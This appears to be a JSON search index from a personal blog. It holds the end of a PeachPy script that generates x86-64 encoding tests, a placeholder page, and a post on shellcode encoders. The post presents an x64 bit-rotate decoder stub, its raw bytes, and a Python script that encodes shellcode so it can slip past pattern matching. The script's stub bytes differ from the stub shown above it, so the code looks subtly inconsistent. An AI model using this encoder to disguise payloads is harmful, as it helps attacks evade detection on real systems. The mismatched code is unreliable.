\"m512\" : [ \"zword[r8 - 64]\" , \"zword[r8 + 64]\" , \"zword[r8 - 128]\" ], 180 } 181 peachpy_value_map = { 182 \"vm32x{k}\" : \"[rsi + xmm0(k1) * 4 - 128]\" , 183 \"vm32y{k}\" : \"[r11 + ymm8(k2) * 4 + 48]\" , 184 \"vm32z{k}\" : \"[r15 + zmm19(k3) * 4 - 16]\" , 185 \"vm64x{k}\" : \"[rsi + xmm1(k4) * 8 + 40]\" , 186 \"vm64y{k}\" : \"[r11 + ymm9(k5) * 8 - 56]\" , 187 \"vm64z{k}\" : \"[r15 + zmm20(k6) * 8 + 72]\" , 188 } 189 optype = operand . type 190 operand = value_map . get ( optype ) 191 if evex : 192 operand = evex_value_map . get ( optype , operand ) 193 if peachpy : 194 operand = peachpy_value_map . get ( optype , operand ) 195 if isinstance ( operand , list ): 196 operand = operand [ operand_number ] 197 if operand is not None and not peachpy : 198 operand = operand . \\ 199 replace ( \"byte\" , \"BYTE PTR \" ) . \\ 200 replace ( \"dword\" , \"DWORD PTR\" ) . \\ 201 replace ( \"qword\" , \"QWORD PTR\" ) . \\ 202 replace ( \"oword\" , \"XMMWORD PTR\" ) . \\ 203 replace ( \"hword\" , \"YMMWORD PTR\" ) . \\ 204 replace ( \"zword\" , \"ZMMWORD PTR\" ) . \\ 205 replace ( \"word\" , \"WORD PTR\" ) . \\ 206 replace ( \"rip\" , \"$+2\" ) 207 if operand is not None and peachpy : 208 for kn in range ( 1 , 8 ): 209 kreg = \"k\" + str ( kn ) 210 operand = operand . replace ( \"{\" + kreg + \"}\" , \"(\" + kreg + \")\" ) 211 operand = operand . replace ( \"){z}\" , \".z)\" ) 212 operand = operand . replace ( \"{rn-sae}\" , \"{rn_sae}\" ) 213 operand = operand . replace ( \"{rz-sae}\" , \"{rz_sae}\" ) 214 operand = operand . replace ( \"{ru-sae}\" , \"{ru_sae}\" ) 215 operand = operand . replace ( \"{rd-sae}\" , \"{rd_sae}\" ) 216 return operand 217 218 219 tab = \" \" * 4 220 221 def main ( package_root = \".\" ): 222 for group , instruction_names in instruction_groups . items (): 223 with open ( os . path . join ( package_root , \"test\" , \"x86_64\" , \"encoding\" , \"test_ %s .py\" % group ), \"w\" ) as out : 224 with CodeWriter () as code : 225 code . line ( \"# This file is auto-generated by /codegen/x86_64_test_encoding.py\" ) 226 code . line ( \"# Reference opcodes are generated by:\" ) 227 code . line ( \"# \" + gas ( \"--version\" ) . splitlines ()[ 0 ]) 228 code . line () 229 code . line ( \"from peachpy.x86_64 import *\" ) 230 code . line ( \"import unittest\" ) 231 code . line () 232 code . line () 233 for name in instruction_names : 234 code . line ( \"class Test %s (unittest.TestCase):\" % name ) 235 with CodeBlock (): 236 code . line ( \"def runTest(self):\" ) 237 with CodeBlock (): 238 # Instructions with `name` name 239 name_instructions = list ( filter ( lambda i : i . name == name , instruction_set )) 240 if not name_instructions : 241 print ( \"No forms for instruction: \" + name ) 242 continue 243 assert len ( name_instructions ) == 1 244 name_instruction = name_instructions [ 0 ] 245 246 has_assertions = False 247 for instruction_form in filter_instruction_forms ( name_instruction . forms ): 248 is_avx512 = is_avx512_instruction_form ( instruction_form ) 249 peachpy_operands = [ generate_operand ( o , i , peachpy = True , evex = is_avx512 ) for ( i , o ) 250 in enumerate ( instruction_form . operands )] 251 gas_operands = [ generate_operand ( o , i , peachpy = False , evex = is_avx512 ) for ( i , o ) 252 in enumerate ( instruction_form . operands )] 253 if not any ( map ( lambda op : op is None , gas_operands )): 254 gas_assembly = \" %s %s \" % ( instruction_form . name , \", \" . join ( gas_operands )) 255 peachpy_assembly = \" %s ( %s )\" % ( instruction_form . name , \", \" . join ( peachpy_operands )) 256 reference_bytecode = binutils_encode ( gas_assembly ) 257 code . line ( \"self.assertEqual( %s , %s .encode())\" % 258 ( reference_bytecode , peachpy_assembly )) 259 has_assertions = True 260 if not has_assertions : 261 code . line ( \"pass\" ) 262 code . line () 263 code . line () 264 265 print ( str ( code ), file = out ) 266 267 if __name__ == '__main__' : 268 main ()","tags":"code","url":"2017/shellcode-encoder.html"},{"title":"Shellcode Encoders 2","text":"Shellcode encoders are used to defeat basic pattern matching or remove bad bytes from a payload. The following encoder rotates bytes. I decided to rotate 3 bits left when encoding, meaning the decoder needs to rotate right 3 bits. Here is the decoder logic: 1 _start: 2 jmp encoded 3 4 getaddr: 5 pop rbx ; *rbx stores data 6 7 xor ecx , ecx 8 add cl , 0xff ; replace with shellcode size 9 10 decode: 11 ror byte [ rbx + rcx ], 0x3 12 loop decode 13 14 jmp rbx 15 16 encoded: 17 call getaddr 18 19 ; db 0x.... encoded bytes go here This resulted in the following 21 byte stub: 1 \\xeb\\x0e\\x5b\\x31\\xc9\\x80\\xc1\\x20\\xc0\\x0c\\x0b\\x03\\xe2\\xfa\\xff\\xe3\\xe8\\xed\\xff\\xff\\xff x64 Bit-Rotate Encoder Here is a python script that basically just rotates all the bits left by 3, and then prepends the decoder stub (changing the length in the cl register appropriately). 1 def rol ( byte , count ): 2 return ( byte << count | byte >> ( 8 - count )) & 0xff 3 4 def hex_string ( byte ): 5 return \" \\\\ \" + hex ( byte )[ 1 : ] 6 7 def rot_encode_vector ( shellcode ): 8 encoded = [] 9 for byte in shellcode : 10 encoded . append ( rol ( byte , 3 )) 11 12 return encoded 13 14 def add_decoder_stub ( encoded ): 15 decoder = \" \\\\ xeb \\\\ x0e \\\\ x5b \\\\ x31 \\\\ xc9 \\\\ x80 \\\\ xc1 \\\\ x04\" 16 decoder += hex_string ( len ( encoded )) 17 decoder += \" \\\\ xc0 \\\\ x0c \\\\ x0b \\\\ x03 \\\\ xe2 \\\\ xfa \\\\ xff \\\\ xe3\" 18 decoder += \" \\\\ xe8 \\\\ xed \\\\ xff \\\\ xff \\\\ xff\" 19 20 for byte in encoded : 21 decoder += hex_string ( byte ) 22 23 return decoder 24 25 def rot_encode ( shellcode ): 26 shellcode_vector = shellcode . split ( ' \\\\ x' )[ 1 : ] 27 shellcode_vector = [ int ( y , 16 ) for y in shellcode_vector ] 28 29 encoded_vector = rot_encode_vector ( shellcode_vector ) 30 complete = add_decoder_stub ( encoded_vector ) 31 32 return complete , encoded_vector , shellcode_vector 33 34 if __name__ == '__main__' : 35 import argparse 36 args = argparse . ArgumentParser ( description = 'Bit-Rotate Encoder' ) 37 args . add_argument ( 'shellcode' , help = 'shellcode to encode' ) 38 39 argv = args . parse_args () 40 41 out , encv , scv = rot_encode ( argv . shellcode ) 42 43 print 'Original length: %d ' % ( len ( scv )) 44 print argv . shellcode 45 print 46 print 'Encoded length: %d ' % ( len ( out ) / 4 ) 47 print out 48 print 49 print 'db ' + ', ' . join ( map ( hex , encv ))","tags":"code","url":"2016/shellcode-encoder-2.html"},{"title":"Initial content","text":"This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption. In this case, the legend consists of this paragraph and the following table: Symbol Meaning Disc 1 Bit yes Bit","tags":"project","url":"2016/content.html"}]}